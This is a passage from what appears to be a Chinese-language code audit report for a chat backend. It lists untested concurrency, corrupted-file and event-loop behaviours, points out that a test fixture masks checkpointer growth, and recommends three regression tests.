[H2](#h2) CSP header

## 排程

[H3](#h3) · [M1](#m1) · [M2](#m2) · [M3](#m3) · [F5](#f5) · [F6](#f6) ·
[S2-1](#s2-1) · [S2-2](#s2-2) · [S2-3](#s2-3) · [S2-4](#s2-4) · [S3](#s3) · [N3](#n3) · [N6](#n6) · [L1–L4](#l1l4)

---

# 九、測試缺口

現有測試**完全沒有 pin** 的行為：

- 同 sessionId 的兩個併發 `/chat`（[S0-1](#s0-1)）
- checkpointer 的成長與併發寫入（[S0-2](#s0-2)、[S1-3](#s1-3)）
- `load_all_results` 遇到損毀檔（[S0-1b](#s0-1b)）
- `stage_skills` 與進行中 turn 的重疊（[S1-2](#s1-2)）
- event loop 阻塞（[S0-3](#s0-3)、[S1-1](#s1-1)、[F4](#f4)）
- client 斷線後的 task 生命週期（[F1](#f1)）

> `tests/conftest.py` 的 autouse `reset_for_tests()` 讓 checkpointer 在每個測試間歸零，
> **正好把 [S0-2](#s0-2) 的成長行為藏起來**。

建議優先補三條回歸測試：

1. 兩個 `ToolResultRecorder`/`connection_lock` 打同一 workspace 的 barrier 測試（[S0-1](#s0-1)）
2. `load_all_results` 對損毀 JSON 的降級（[S0-1b](#s0-1b)）
3. 背景重 stage 時 `DashboardSkillGateMiddleware._required_paths` 的完整性（[S1-2](#s1-2)）

html_guard 的每條 repro 都已是可直接貼上的最小案例，
放 `tests/test_html_guard.py`，命名沿用 `methodName_condition_expectedBehavior`。
